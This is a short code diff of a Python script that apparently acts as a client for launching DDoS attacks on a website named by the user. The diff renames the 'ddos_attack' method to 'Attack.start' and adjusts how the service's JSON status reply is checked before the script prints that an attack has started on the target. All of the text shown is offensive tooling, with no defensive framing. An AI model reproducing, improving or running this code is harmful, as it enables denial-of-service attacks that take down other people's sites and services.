@@ -8,8 +8,8 @@ init(convert=True)
 
 httpx_client: object = httpx.Client(timeout=None) 
 
-class Requests:        
-    def ddos_attack(self, website: str, method: str) -> bool:
+class Attack:        
+    def start(self, website: str, method: str) -> bool:
         try:
             if method.lower() != "https" and method.lower() != "http":
                 return False
@@ -60,10 +60,10 @@ class Requests:
                 if response.status_code == 200:
                     response_content: str = response.content.decode("utf-8")
                     response_content: dict = json.loads(response_content)
-                    
-                    if response_content["status"] == "False":
+                                        
+                    if response_content["status"] == False:
                         print(f"{Fore.RED}[ATTACK]{Fore.RED}{Fore.RESET} {response_content['message']}")
-                    elif response_content["status"] == "True":
+                    elif response_content["status"] == True:
                         print(f"{Fore.GREEN}[ATTACK]{Fore.GREEN}{Fore.RESET} Attack has started on {new_url}")
                     else:
                         return False
